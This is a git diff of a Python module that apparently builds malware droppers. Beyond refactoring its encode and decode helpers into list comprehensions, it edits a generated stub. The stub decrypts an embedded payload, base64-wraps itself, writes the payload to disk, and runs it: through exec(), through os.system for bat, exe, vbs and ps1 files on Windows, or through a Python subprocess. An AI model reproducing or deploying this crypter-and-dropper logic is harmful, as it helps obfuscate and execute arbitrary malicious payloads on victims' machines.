@@ -134,61 +134,68 @@ class StartModule():
 
 	def __mensajeASCII__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__mensajeASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		men = []
-		for palabra in mensaje:
-			men.append(ord(palabra))
+		men = [ord(pal) for pal in mensaje]
+		#men = []
+		#for palabra in mensaje:
+		#	men.append(ord(palabra))
 		return men
 
 	def __ASCII_Hex__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__ASCII_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		mensajeHex = []
-		for numero in mensaje:
-			mensajeHex.append(hex(numero)[2:])
+		mensajeHex = [hex(numero)[2:] for numero in mensaje]
+		#mensajeHex = []
+		#for numero in mensaje:
+		#	mensajeHex.append(hex(numero)[2:])
 		return mensajeHex
 
 	def __Hex_Base64__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_Base64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		mensajeBase64 = []
-		for numero in mensaje:
-			mensajeBase64.append(base64.b64encode(numero.encode()))
+		mensajeBase64 = [base64.b64encode(numero.encode()) for numero in mensaje]
+		#mensajeBase64 = []
+		#for numero in mensaje:
+		#	mensajeBase64.append(base64.b64encode(numero.encode()))
 		return mensajeBase64
 
 	def __unirBase64__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		msg_base64 = "".encode()
-		for i in range(0, len(mensaje)):
-			msg_base64 = msg_base64 + mensaje[i]
+		msg_base64 = ''.join([mensaje[i].decode('utf-8') for i in range(0, len(mensaje))])
+		#msg_base64 = "".encode()
+		#for i in range(0, len(mensaje)):
+		#	msg_base64 = msg_base64 + mensaje[i]
 		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='{msg_base64} ...'.format(msg_base64=msg_base64[0:10]), debug_module=True)
-		return msg_base64
+		return msg_base64.encode()
 
 	def __recibirBase64__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__recibirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		msg_base64 = []
-		for i in range(0,len(mensaje), 4):
-			msg_base64.append(mensaje[i:i+4])
+		msg_base64 = [mensaje[i:i+4] for i in range(0, len(mensaje), 4)]
+		#msg_base64 = []
+		#for i in range(0,len(mensaje), 4):
+		#	msg_base64.append(mensaje[i:i+4])
 		return msg_base64
 		
 	def __Base64_Hex__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__Base64_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		mensajeHex = []
-		for b64 in mensaje:
-			mensajeHex.append(base64.b64decode(b64))
+		mensajeHex = [base64.b64decode(b64) for b64 in mensaje]
+		#mensajeHex = []
+		#for b64 in mensaje:
+		#	mensajeHex.append(base64.b64decode(b64))
 		return mensajeHex
 
 	def __Hex_decimal__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_decimal__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		mensajeDecimal = []
-		for hexa in mensaje:
-			hexa = hexa.decode("UTF-8")
-			numero = int(hexa, 16)
-			mensajeDecimal.append(numero)    
+		mensajeDecimal = [int(hexa.decode("UTF-8"), 16) for hexa in mensaje]
+		#mensajeDecimal = []
+		#for hexa in mensaje:
+		#	hexa = hexa.decode("UTF-8")
+		#	numero = int(hexa, 16)
+		#	mensajeDecimal.append(numero)    
 		return mensajeDecimal
 
 	def __decimal_ASCII__(self, mensaje):
 		Logger.printMessage(message='{methodName}'.format(methodName='__decimal_ASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
-		mensaje1 = ""
-		for decimal in mensaje:
-			mensaje1 = mensaje1 + chr(decimal)
+		mensaje1 = ''.join([chr(decimal) for decimal in mensaje])
+		#for decimal in mensaje:
+		#	mensaje1 = mensaje1 + chr(decimal)
 		return mensaje1
 
 	# FIN RSA
@@ -272,59 +279,48 @@ def dcy(pk, cptx):
 	ba64 = base64.b64decode(deasc.encode())
 	return ba64
 def __reBa64__(m):
-	mBa64 = []
-	for i in range(0,len(m), 4):
-		mBa64.append(m[i:i+4])
+	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]
 	return mBa64
 def __ba64Hex__(m):
-	mHx = []
-	for b64 in m:
-		mHx.append(base64.b64decode(b64).decode("utf-8"))
+	mHx = [base64.b64decode(b64) for b64 in m]
 	return mHx
 def __hexDec__(m):
-	mDec = []
-	for hx in m:
-		hx = hx
-		n = int(hx, 16)
-		mDec.append(n)
+	mDec = [int(hexa.decode("UTF-8"), 16) for hexa in m]
 	return mDec
 def __deAS__(m):
-	m1 = ""
-	for d in m:
-		m1 = m1 + chr(d)
+	m1 = ''.join([chr(d) for d in m])
 	return m1
 def __meAS__(m):
-	men = []
-	for p in m:
-		men.append(ord(p))
+	men = [ord(p) for p in m]
 	return men
 dcy_data = dcy(pk=pk, cptx=cdx)
 """
 		if is_iterating:
-			stub = "cdx = \"" + crypto_data_hex + "\"\n"
+			stub += "cdx = \"" + crypto_data_hex + "\"\n"
 			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
-			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\nexec(dcy_data.encode('utf-8'))"
+			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\n"
+			stub += "exec(dcy_data)"
 		else:
 			stub += """
-# Save file
+image_extensions = ('jpg', 'jpeg', 'bpm', 'ico', 'png')
+exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
+python_extensions = ('py')
 nf = open(drpnm, 'wb')
 try:
 \tnf.write(dcy_data)
 except:
 \tpass
 nf.close()
-image_extensions = ('jpg', 'jpeg', 'bpm', 'ico')
-exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
-if drpnm.split('.')[1] in image_extensions:
-\timageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
-\tsubprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
-if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
-\tos.system(drpnm)
-# Execute file
-#import subprocess
-#proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+if os.path.exists(drpnm):
+\tif drpnm.split('.')[1] in image_extensions:
+\t\timageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
+\t\tsubprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
+\tif drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
+\t\tos.system(drpnm)
+\tif drpnm.split('.')[1] in python_extensions:
+\t\texec(dcy_data)
+\t\tproc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 """
-			stub += "exec(dcy_data)"
 
 		stub_base64 = base64.b64encode(stub.encode('utf-8'))
 		stub = "import base64\n"
